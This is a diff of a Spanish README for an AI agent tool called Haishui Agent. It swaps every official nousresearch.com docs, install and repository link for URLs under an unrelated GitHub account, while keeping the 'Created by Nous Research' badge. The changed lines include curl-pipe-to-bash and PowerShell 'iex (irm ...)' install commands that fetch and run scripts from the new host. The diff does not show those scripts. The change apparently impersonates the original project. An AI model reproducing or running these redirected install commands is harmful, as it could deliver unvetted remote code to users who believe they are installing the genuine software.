@@ -4,12 +4,12 @@
 
 # Haishui Agent ☤
 <p align="center">
-  <a href="https://haishui-agent.nousresearch.com/">Haishui Agent</a> | <a href="https://haishui-agent.nousresearch.com/">Haishui Desktop</a>
+  <a href="https://aiqinghaiwork163.github.io/haishui-agent/">Haishui Agent</a> | <a href="https://aiqinghaiwork163.github.io/haishui-agent/">Haishui Desktop</a>
 </p>
 <p align="center">
-  <a href="https://haishui-agent.nousresearch.com/docs/"><img src="https://img.shields.io/badge/Docs-haishui--agent.nousresearch.com-FFD700?style=for-the-badge" alt="Documentación"></a>
+  <a href="https://aiqinghaiwork163.github.io/haishui-agent/docs/"><img src="https://img.shields.io/badge/Docs-aiqinghaiwork163.github.io/haishui-agent-FFD700?style=for-the-badge" alt="Documentación"></a>
   <a href="https://discord.gg/NousResearch"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord"></a>
-  <a href="https://github.com/NousResearch/haishui-agent/blob/main/LICENSE"><img src="https://img.shields.io/badge/Licencia-MIT-green?style=for-the-badge" alt="Licencia: MIT"></a>
+  <a href="https://github.com/aiqinghaiwork163/haishui-agent/blob/main/LICENSE"><img src="https://img.shields.io/badge/Licencia-MIT-green?style=for-the-badge" alt="Licencia: MIT"></a>
   <a href="https://nousresearch.com"><img src="https://img.shields.io/badge/Creado%20por-Nous%20Research-blueviolet?style=for-the-badge" alt="Creado por Nous Research"></a>
   <a href="README.md"><img src="https://img.shields.io/badge/Lang-English-blue?style=for-the-badge" alt="English"></a>
   <a href="README.zh-CN.md"><img src="https://img.shields.io/badge/Lang-中文-red?style=for-the-badge" alt="中文"></a>
@@ -37,24 +37,24 @@ Usa cualquier modelo que quieras — [Nous Portal](https://portal.nousresearch.c
 ### Linux, macOS, WSL2, Termux
 
 ```bash
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 ```
 
 ### Windows (nativo, PowerShell)
 
-> **Nota:** En Windows nativo, Haishui funciona sin WSL — la CLI, el gateway, la TUI y las herramientas funcionan de forma nativa. Si prefieres usar WSL2, el comando de Linux/macOS de arriba también funciona allí. ¿Encontraste un error? Por favor [crea un issue](https://github.com/NousResearch/haishui-agent/issues).
+> **Nota:** En Windows nativo, Haishui funciona sin WSL — la CLI, el gateway, la TUI y las herramientas funcionan de forma nativa. Si prefieres usar WSL2, el comando de Linux/macOS de arriba también funciona allí. ¿Encontraste un error? Por favor [crea un issue](https://github.com/aiqinghaiwork163/haishui-agent/issues).
 
 Ejecuta esto en PowerShell:
 
 ```powershell
-iex (irm https://haishui-agent.nousresearch.com/install.ps1)
+iex (irm https://aiqinghaiwork163.github.io/haishui-agent/install.ps1)
 ```
 
 El instalador se encarga de todo: uv, Python 3.11, Node.js, ripgrep, ffmpeg, **y un Git Bash portátil** (MinGit, descomprimido en `%LOCALAPPDATA%\haishui\git` — no requiere administrador, completamente aislado de cualquier instalación de Git del sistema). Haishui usa este Git Bash incluido para ejecutar comandos de shell.
 
 Si ya tienes Git instalado, el instalador lo detecta y lo usa en su lugar. De lo contrario, una descarga de ~45MB de MinGit es todo lo que necesitas — no tocará ni interferirá con ningún Git del sistema.
 
-> **Android / Termux:** La ruta manual probada está documentada en la [guía de Termux](https://haishui-agent.nousresearch.com/docs/getting-started/termux). En Termux, Haishui instala el extra `.[termux]` curado porque el extra completo `.[all]` actualmente incluye dependencias de voz incompatibles con Android.
+> **Android / Termux:** La ruta manual probada está documentada en la [guía de Termux](https://aiqinghaiwork163.github.io/haishui-agent/docs/getting-started/termux). En Termux, Haishui instala el extra `.[termux]` curado porque el extra completo `.[all]` actualmente incluye dependencias de voz incompatibles con Android.
 >
 > **Windows:** Windows nativo es totalmente compatible — el comando de PowerShell de arriba instala todo. Si prefieres usar WSL2, el comando de Linux también funciona allí. La instalación nativa de Windows se encuentra en `%LOCALAPPDATA%\haishui`; WSL2 instala en `~/.haishui` como en Linux.
 
@@ -81,7 +81,7 @@ haishui update       # Actualiza a la última versión
 haishui doctor       # Diagnostica cualquier problema
 ```
 
-📖 **[Documentación completa →](https://haishui-agent.nousresearch.com/docs/)**
+📖 **[Documentación completa →](https://aiqinghaiwork163.github.io/haishui-agent/docs/)**
 
 ---
 
@@ -98,7 +98,7 @@ Un comando desde una instalación nueva:
 haishui setup --portal
 ```
 
-Esto te autentica vía OAuth, establece Nous como tu proveedor y activa el Tool Gateway. Comprueba qué está conectado en cualquier momento con `haishui portal info`. Detalles completos en la [página de documentación del Tool Gateway](https://haishui-agent.nousresearch.com/docs/user-guide/features/tool-gateway).
+Esto te autentica vía OAuth, establece Nous como tu proveedor y activa el Tool Gateway. Comprueba qué está conectado en cualquier momento con `haishui portal info`. Detalles completos en la [página de documentación del Tool Gateway](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/tool-gateway).
 
 Puedes seguir usando tus propias claves por herramienta cuando quieras — el gateway es por backend, no todo o nada.
 
@@ -120,31 +120,31 @@ Haishui tiene dos puntos de entrada: inicia la interfaz de terminal con `haishui
 | Interrumpir trabajo actual          | `Ctrl+C` o enviar un nuevo mensaje            | `/stop` o enviar un nuevo mensaje                                                 |
 | Estado específico de plataforma     | `/platforms`                                  | `/status`, `/sethome`                                                             |
 
-Para las listas de comandos completas, consulta la [guía de CLI](https://haishui-agent.nousresearch.com/docs/user-guide/cli) y la [guía del Gateway de Mensajería](https://haishui-agent.nousresearch.com/docs/user-guide/messaging).
+Para las listas de comandos completas, consulta la [guía de CLI](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/cli) y la [guía del Gateway de Mensajería](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/messaging).
 
 ---
 
 ## Documentación
 
-Toda la documentación está en **[haishui-agent.nousresearch.com/docs](https://haishui-agent.nousresearch.com/docs/)**:
+Toda la documentación está en **[aiqinghaiwork163.github.io/haishui-agent/docs](https://aiqinghaiwork163.github.io/haishui-agent/docs/)**:
 
 | Sección                                                                                             | Contenido                                                    |
 | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
-| [Inicio rápido](https://haishui-agent.nousresearch.com/docs/getting-started/quickstart)              | Instalar → configurar → primera conversación en 2 minutos   |
-| [Uso de CLI](https://haishui-agent.nousresearch.com/docs/user-guide/cli)                             | Comandos, atajos de teclado, personalidades, sesiones        |
-| [Configuración](https://haishui-agent.nousresearch.com/docs/user-guide/configuration)               | Archivo de configuración, proveedores, modelos, todas las opciones |
-| [Gateway de Mensajería](https://haishui-agent.nousresearch.com/docs/user-guide/messaging)           | Telegram, Discord, Slack, WhatsApp, Signal, Home Assistant   |
-| [Seguridad](https://haishui-agent.nousresearch.com/docs/user-guide/security)                        | Aprobación de comandos, emparejamiento por DM, aislamiento en contenedor |
-| [Herramientas y Toolsets](https://haishui-agent.nousresearch.com/docs/user-guide/features/tools)   | Más de 40 herramientas, sistema de toolsets, backends de terminal |
-| [Sistema de Habilidades](https://haishui-agent.nousresearch.com/docs/user-guide/features/skills)   | Memoria procedimental, Skills Hub, creación de habilidades   |
-| [Memoria](https://haishui-agent.nousresearch.com/docs/user-guide/features/memory)                   | Memoria persistente, perfiles de usuario, mejores prácticas  |
-| [Integración MCP](https://haishui-agent.nousresearch.com/docs/user-guide/features/mcp)              | Conecta cualquier servidor MCP para capacidades extendidas   |
-| [Programación Cron](https://haishui-agent.nousresearch.com/docs/user-guide/features/cron)           | Tareas programadas con entrega a plataforma                  |
-| [Archivos de Contexto](https://haishui-agent.nousresearch.com/docs/user-guide/features/context-files) | Contexto de proyecto que da forma a cada conversación      |
-| [Arquitectura](https://haishui-agent.nousresearch.com/docs/developer-guide/architecture)            | Estructura del proyecto, bucle del agente, clases principales |
-| [Contribuir](https://haishui-agent.nousresearch.com/docs/developer-guide/contributing)              | Configuración de desarrollo, proceso de PR, estilo de código |
-| [Referencia de CLI](https://haishui-agent.nousresearch.com/docs/reference/cli-commands)             | Todos los comandos y flags                                   |
-| [Variables de Entorno](https://haishui-agent.nousresearch.com/docs/reference/environment-variables) | Referencia completa de variables de entorno                  |
+| [Inicio rápido](https://aiqinghaiwork163.github.io/haishui-agent/docs/getting-started/quickstart)              | Instalar → configurar → primera conversación en 2 minutos   |
+| [Uso de CLI](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/cli)                             | Comandos, atajos de teclado, personalidades, sesiones        |
+| [Configuración](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/configuration)               | Archivo de configuración, proveedores, modelos, todas las opciones |
+| [Gateway de Mensajería](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/messaging)           | Telegram, Discord, Slack, WhatsApp, Signal, Home Assistant   |
+| [Seguridad](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/security)                        | Aprobación de comandos, emparejamiento por DM, aislamiento en contenedor |
+| [Herramientas y Toolsets](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/tools)   | Más de 40 herramientas, sistema de toolsets, backends de terminal |
+| [Sistema de Habilidades](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/skills)   | Memoria procedimental, Skills Hub, creación de habilidades   |
+| [Memoria](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/memory)                   | Memoria persistente, perfiles de usuario, mejores prácticas  |
+| [Integración MCP](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/mcp)              | Conecta cualquier servidor MCP para capacidades extendidas   |
+| [Programación Cron](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/cron)           | Tareas programadas con entrega a plataforma                  |
+| [Archivos de Contexto](https://aiqinghaiwork163.github.io/haishui-agent/docs/user-guide/features/context-files) | Contexto de proyecto que da forma a cada conversación      |
+| [Arquitectura](https://aiqinghaiwork163.github.io/haishui-agent/docs/developer-guide/architecture)            | Estructura del proyecto, bucle del agente, clases principales |
+| [Contribuir](https://aiqinghaiwork163.github.io/haishui-agent/docs/developer-guide/contributing)              | Configuración de desarrollo, proceso de PR, estilo de código |
+| [Referencia de CLI](https://aiqinghaiwork163.github.io/haishui-agent/docs/reference/cli-commands)             | Todos los comandos y flags                                   |
+| [Variables de Entorno](https://aiqinghaiwork163.github.io/haishui-agent/docs/reference/environment-variables) | Referencia completa de variables de entorno                  |
 
 ---
 
@@ -185,7 +185,7 @@ Consulta `haishui claw migrate --help` para todas las opciones, o usa la habilid
 Inicio rápido para colaboradores — clona y comienza con `setup-haishui.sh`:
 
 ```bash
-git clone https://github.com/NousResearch/haishui-agent.git
+git clone https://github.com/aiqinghaiwork163/haishui-agent.git
 cd haishui-agent
 ./setup-haishui.sh     # instala uv, crea venv, instala .[all], enlaza ~/.local/bin/haishui
 ./haishui              # detecta automáticamente el venv, no necesitas hacer `source` primero
@@ -207,7 +207,7 @@ scripts/run_tests.sh
 
 - 💬 [Discord](https://discord.gg/NousResearch)
 - 📚 [Skills Hub](https://agentskills.io)
-- 🐛 [Issues](https://github.com/NousResearch/haishui-agent/issues)
+- 🐛 [Issues](https://github.com/aiqinghaiwork163/haishui-agent/issues)
 - 🔌 [computer-use-linux](https://github.com/avifenesh/computer-use-linux) — Servidor MCP de control de escritorio Linux para Haishui y otros hosts MCP, con árboles de accesibilidad AT-SPI, entrada Wayland/X11, capturas de pantalla y targeting de ventanas del compositor.
 - 🔌 [HaishuiClaw](https://github.com/AaronWong1999/haishuiclaw) — Puente WeChat comunitario: Ejecuta Haishui Agent y OpenClaw en la misma cuenta de WeChat.
 
